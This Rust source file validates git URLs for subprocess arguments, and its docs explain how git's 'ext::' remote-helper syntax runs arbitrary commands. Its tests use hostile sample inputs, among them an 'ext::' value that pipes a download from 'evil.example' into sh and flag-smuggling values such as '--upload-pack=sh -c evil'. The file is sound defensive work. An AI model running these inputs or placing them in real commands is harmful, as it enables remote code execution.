//! The one validator for any URL that reaches a subprocess argument vector.
//!
//! # Why this is not in `agents::git`
//!
//! The agent store is the *first* place a user-chosen URL reaches `argv`. It is
//! not the last. `[repo] remote` in `.vibe/project.toml` is user-controlled,
//! travels in a **committed** file — so it arrives from a repository you cloned,
//! not only from your own typing — and reaches `argv` the moment P5 wires up
//! `gh remote add` or `git push`. A validator living inside the store module
//! would be re-implemented, or forgotten, at that second call site.
//!
//! **Every operation that puts a URL in `argv` takes a [`GitUrl`], not a
//! `String`.** That is the enforcement: the closed operation set in
//! [`crate::agents::GitOp`] has no variant that accepts an unvalidated URL, so
//! a new op cannot skip this by accident — it has to change a type signature to
//! do so, which is a visible diff rather than an omission.
//!
//! # Why a fourth rule was needed at all
//!
//! ADR-0005 §10 rules 1–3 are all **argv-shaped**: they decide which flags may
//! appear and what the environment contains. The positional URL slot is by
//! definition the one place that must accept a user string, so no argv filter
//! can ever cover it — `--` protects the value from being *read* as a flag and
//! does nothing whatever about what it *means*. The rules were not wrong; they
//! were the wrong kind of rule for this slot. Rule 4 filters the value.
//!
//! The concrete hole, verified rather than reasoned about:
//!
//! ```text
//! git clone -- 'ext::touch /tmp/pwned'
//! ```
//!
//! `<transport>::<address>` makes `git` exec a remote helper named
//! `git-remote-<transport>`; the built-in `ext::` helper's documented purpose is
//! to run an arbitrary command. It is neither a program nor a flag, so rule 1's
//! closed enum, rule 2's argument filter and the `--` separator all see nothing.
//!
//! Two details make this worth a categorical rejection rather than a shrug, and
//! the second is the one a future reader will otherwise assume was covered:
//!
//! 1. Modern `git` refuses `ext::` **by default**, so the naive check looks
//!    reassuring.
//! 2. It is re-enabled by the **per-user** `~/.gitconfig`, and
//!    **`GIT_CONFIG_NOSYSTEM=1` covers `/etc/gitconfig` only — while `HOME` is
//!    necessarily on rule 3's allowlist, because `git` cannot find its own
//!    configuration without it.** That is the specific hole. Under this crate's
//!    exact constructed environment, with `protocol.ext.allow = always` in a
//!    user config, the command runs.

use crate::error::CoreError;

/// A URL that has been validated for use in a subprocess argument vector.
///
/// There is no way to construct one except [`GitUrl::parse`], and no operation
/// in this crate accepts a URL in any other form.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub struct GitUrl(String);

/// Transport schemes permitted in a URL reaching `argv`.
///
/// A closed allowlist, not a denylist of the ones known to be dangerous. The
/// `ext::` finding is exactly what a denylist would have missed: nobody writes
/// down a transport they have not heard of.
const ALLOWED_SCHEMES: &[&str] = &["https", "ssh"];

impl GitUrl {
    /// Validate a URL, or say precisely what is wrong with it.
    ///
    /// Permits `https://`, `ssh://`, the scp-like `user@host:path` form, and an
    /// absolute local filesystem path. Everything else is rejected.
    ///
    /// # The local-path case, and its asymmetry with `file://`
    ///
    /// Rule 4 as first drafted permitted only the two schemes and the scp-like
    /// form. An absolute local path is permitted too, because ADR-0006 §1
    /// promises the store works "against any host, or a local path, or a fork"
    /// — and because without it the store cannot be tested at all without a
    /// network, which would leave every containment property in this module
    /// asserted only against strings.
    ///
    /// Two conditions are what make it statable as a rule rather than an
    /// exception, and both are checked below:
    ///
    /// 1. **Absolute.** `git` resolves a relative path against a working
    ///    directory *this crate* chose, so accepting one would make a user
    ///    string's meaning depend on our own state.
    /// 2. **Not beginning with `-`.** Rule 2's shape check, applied at
    ///    construction rather than only at use, so a bad value is reported
    ///    where the config is read instead of from inside a clone. The `--` in
    ///    the constructed argv is the second lock, not the first.
    ///
    /// `file://` stays rejected, and the asymmetry is not arbitrary. A `file://`
    /// URL goes through `git`'s URL machinery and its transport layer; a bare
    /// absolute path takes the local-clone path instead and is never parsed as a
    /// URL. Keeping the *scheme* allowlist closed is the property worth having,
    /// and a value that is unambiguously a filesystem path — absolute, with no
    /// `://` and no `::` — cannot name a transport whatever `git` does with it.
    ///
    /// Cloning from a local repository does **not** execute that repository's
    /// hooks — recorded in ADR-0005 §10 rule 4, because rule 6 makes the
    /// opposite a reasonable thing for a reader to assume. Verified on git
    /// 2.45.1 and **pending confirmation on 2.54**: it is a negative result
    /// about security-relevant behaviour, established on an older `git` than
    /// the one the `ext::` hole was found on.
    pub fn parse(raw: &str) -> Result<Self, CoreError> {
        let reject = |why: &'static str| {
            Err(CoreError::GitUrlRejected {
                url: raw.to_owned(),
                why,
            })
        };
        let s = raw.trim();

        if s.is_empty() {
            return reject("it is empty");
        }

        // Rule 2's shape check, applied at construction rather than only at use,
        // so a bad value is reported when the config is read instead of from
        // inside a clone. `--` in the constructed argv is the second lock.
        if s.starts_with('-') {
            return reject("it starts with `-`, which git may read as an option");
        }

        // The rule-4 case. See the module docs.
        if s.contains("::") {
            return reject(
                "it names a git remote helper (`transport::address`), which executes \
                 an arbitrary command",
            );
        }

        // A control character in argv is never anything but an attempt to
        // confuse a parser downstream of us.
        if s.chars().any(|c| c.is_control()) {
            return reject("it contains a control character");
        }

        // An absolute filesystem path. Checked before the scheme split so a
        // Windows drive letter is never mistaken for scp-like `host:path`.
        if is_absolute_local_path(s) {
            return Ok(GitUrl(s.to_owned()));
        }

        if let Some((scheme, rest)) = s.split_once("://") {
            if rest.is_empty() {
                return reject("it has no host");
            }
            let scheme = scheme.to_ascii_lowercase();
            if ALLOWED_SCHEMES.contains(&scheme.as_str()) {
                return Ok(GitUrl(s.to_owned()));
            }
            return match scheme.as_str() {
                // Refused on the same reasoning as `::`, one step removed. The
                // store's contents are markdown that gets fed to an agent with
                // tool access, so an attacker who can rewrite the bytes in
                // flight is writing that agent's instructions. A plaintext
                // transport makes that a network position rather than a
                // compromise.
                "http" | "git" => reject(
                    "it uses an unauthenticated plaintext transport; agent files become \
                     instructions for a tool-using agent, so they must not be modifiable \
                     in flight - use https:// or ssh://",
                ),
                // Not "unsupported": permitted as a bare path, refused as a URL,
                // because the scheme allowlist is what is being kept closed.
                "file" => reject(
                    "the file:// scheme is not on the allowlist - pass an absolute local \
                     path instead, which git clones locally without parsing it as a URL",
                ),
                _ => reject("it uses a transport that is not on the allowlist"),
            };
        }

        // scp-like: `[user@]host:path`. The colon must precede any slash, or
        // this is a relative path rather than a remote.
        if let Some((authority, path)) = s.split_once(':') {
            // The host is what follows any `user@`. Checked separately because
            // `git@:path` has a non-empty authority and no host at all, and
            // passing that through would hand `git` a value whose meaning is
            // decided by whatever it does with an empty hostname.
            let host = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
            if host.is_empty() || path.is_empty() || authority.contains('/') {
                return reject("it is not a URL, an scp-like remote, or an absolute path");
            }
            return Ok(GitUrl(s.to_owned()));
        }

        reject("it is not a URL, an scp-like remote, or an absolute path")
    }

    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

/// Whether a value is unambiguously an absolute filesystem path.
///
/// Deliberately platform-independent: both forms are recognised on both
/// platforms. A Windows path reaching a Unix build is a configuration error to
/// report from `git`, not a string to reinterpret as a remote — and treating
/// `C:\src\agents` as the host `C` would be exactly that.
fn is_absolute_local_path(s: &str) -> bool {
    if s.starts_with('/') {
        return true;
    }
    let b = s.as_bytes();
    // `C:\...` or `C:/...`
    b.len() >= 3 && b[0].is_ascii_alphabetic() && b[1] == b':' && (b[2] == b'\\' || b[2] == b'/')
}

impl std::fmt::Display for GitUrl {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rejected(url: &str) -> String {
        match GitUrl::parse(url) {
            Ok(ok) => panic!("`{url}` should have been rejected, got {ok:?}"),
            Err(CoreError::GitUrlRejected { why, .. }) => why.to_owned(),
            Err(other) => panic!("wrong error for `{url}`: {other:?}"),
        }
    }

    /// The rejection rule 4 exists for. `ext::` is not a flag and not a program,
    /// so neither an argv filter nor a `{git, gh}` program allowlist sees it —
    /// it is a *URL* that means "run this command".
    #[test]
    fn a_remote_helper_url_is_refused_because_it_is_arbitrary_execution() {
        let why = rejected(r#"ext::sh -c "curl https://evil.example/x | sh""#);
        assert!(why.contains("remote helper"), "{why}");

        // The general form, not just `ext`. Any `foo::bar` execs
        // `git-remote-foo`, so the rejection is on the shape.
        rejected("transport::whatever");
        rejected("ext::cat %S");
        rejected("https://ok.example/repo.git ext::sh");
    }

    #[test]
    fn a_url_that_looks_like_a_flag_is_refused() {
        let why = rejected("--upload-pack=sh -c evil");
        assert!(why.contains("starts with `-`"), "{why}");
        rejected("-c");
        rejected("--exec-path=/tmp/evil");
    }

    /// A closed allowlist, so an unheard-of transport is refused by default.
    /// This is the property a denylist cannot have, and the `ext::` finding is
    /// exactly what a denylist would have missed.
    #[test]
    fn the_scheme_allowlist_is_closed() {
        let why = rejected("http://example.com/agents.git");
        assert!(why.contains("plaintext"), "{why}");
        rejected("git://example.com/agents.git");

        let why = rejected("file:///home/me/agents");
        assert!(why.contains("absolute local path"), "{why}");

        // Anything nobody has written down.
        for unheard_of in [
            "ftp://example.com/a.git",
            "rsync://example.com/a.git",
            "gcrypt::https://example.com/a",
            "hg::https://example.com/a",
            "javascript://x",
        ] {
            let _ = rejected(unheard_of);
        }
    }

    #[test]
    fn control_characters_are_refused() {
        rejected("https://example.com/a\nb.git");
        rejected("https://example.com/a\0b.git");
    }

    /// The other half. A validator that rejects the legitimate cases is not a
    /// safer validator, it is a broken feature — ADR-0006 §1 promises any host,
    /// a fork, or a local path.
    #[test]
    fn the_urls_a_user_actually_has_are_accepted() {
        for ok in [
            "https://github.com/bort0s/agency-agents.git",
            "https://gitlab.example.internal/team/agents",
            "ssh://git@github.com/bort0s/agents.git",
            "git@github.com:bort0s/agents.git",
            "/home/me/src/agents",
            "C:\\Users\\me\\agents",
            "C:/Users/me/agents",
        ] {
            assert!(GitUrl::parse(ok).is_ok(), "`{ok}` should be accepted");
        }
    }

    /// The two conditions that make the local-path form a *rule* rather than an
    /// exception to one (ADR-0005 §10 rule 4).
    ///
    /// Asserted together and under a name that says so, because each half is
    /// currently also covered incidentally by a test named for something else —
    /// and a property that no test is named after is one nobody notices losing.
    #[test]
    fn a_local_path_must_be_absolute_and_must_not_look_like_a_flag() {
        // Absolute: `git` resolves a relative path against a working directory
        // *this crate* chose, not one the user meant. `~` is in the list
        // because there is no shell in the way to expand it — `git` would take
        // it as a directory literally named `~`.
        for relative in [
            "agents",
            "src/agents",
            "./agents",
            "../agents",
            r"..\agents",
            "~/agents",
        ] {
            let why = rejected(relative);
            assert!(why.contains("absolute path"), "`{relative}`: {why}");
        }

        // Not flag-shaped — and this check runs *before* the absolute-path
        // branch, so a value cannot buy its way past it by also looking like a
        // path.
        for flaglike in ["-/tmp/agents", "--upload-pack=/tmp/agents", "-C/tmp"] {
            let why = rejected(flaglike);
            assert!(why.contains("starts with `-`"), "`{flaglike}`: {why}");
        }

        // The check is on the trimmed value, so padding smuggles nothing past
        // it — `parse` trims first and stores what it checked.
        rejected("  -/tmp/agents  ");
    }

    /// A Windows drive letter must never be read as an scp-like host. Treating
    /// `C:\src\agents` as the host `C` would turn a local path into a network
    /// fetch against a machine named `C`.
    #[test]
    fn a_windows_drive_letter_is_a_path_not_an_scp_host() {
        let url = GitUrl::parse("C:\\src\\agents").unwrap();
        assert_eq!(url.as_str(), "C:\\src\\agents");
        assert!(is_absolute_local_path("C:\\src\\agents"));
        assert!(is_absolute_local_path("/home/me/agents"));
        // A relative path is not accepted: a plan carries resolved values, and
        // `git` would resolve this against a working directory we chose.
        assert!(!is_absolute_local_path("src/agents"));
        rejected("src/agents");
        rejected("./agents");
    }

    #[test]
    fn malformed_shapes_are_refused_rather_than_repaired() {
        rejected("https://");
        rejected("git@:path");
        rejected("git@host:");
        rejected("");
        rejected("   ");
    }

    #[test]
    fn parsing_trims_but_does_not_otherwise_rewrite() {
        let u = GitUrl::parse("  https://example.com/a.git  ").unwrap();
        assert_eq!(u.as_str(), "https://example.com/a.git");
    }
}
